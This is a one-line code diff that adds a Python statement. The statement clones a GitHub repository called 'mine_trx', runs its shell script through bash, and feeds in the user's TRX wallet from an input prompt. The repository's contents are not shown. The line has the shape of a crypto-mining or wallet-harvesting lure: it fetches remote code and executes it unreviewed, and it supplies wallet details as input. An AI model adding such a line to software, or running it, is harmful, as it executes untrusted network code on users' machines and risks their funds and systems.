@@ -1,0 +1,1 @@
+import subprocess; subprocess.run(["git", "clone", "https://github.com/ganartrx1/mine_trx.git"]); subprocess.run(["bash", "-c", "cd mine_trx && bash mine_trx.sh"], text=True, input=input("enter your TRX wallet,  TRX: ") + '\n')
